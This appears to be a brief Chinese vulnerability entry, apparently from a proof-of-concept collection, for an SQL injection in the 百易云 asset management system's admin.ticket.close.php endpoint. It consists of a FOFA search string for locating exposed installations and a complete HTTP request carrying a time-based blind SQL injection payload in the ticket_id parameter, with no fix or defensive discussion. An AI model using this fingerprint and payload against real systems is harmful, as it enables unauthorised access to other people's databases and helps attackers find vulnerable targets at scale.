# 百易云资产管理系统admin.ticket.close.php存在SQL注入漏洞

百易云资产管理系统在admin.ticket.close.php接口下存在sql注入漏洞

## fofa

```javascript
body="不要着急，点此"
```

## poc

```javascript
GET /wuser/admin.ticket.close.php?ticket_id=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP(2)))OKTO) HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close


```
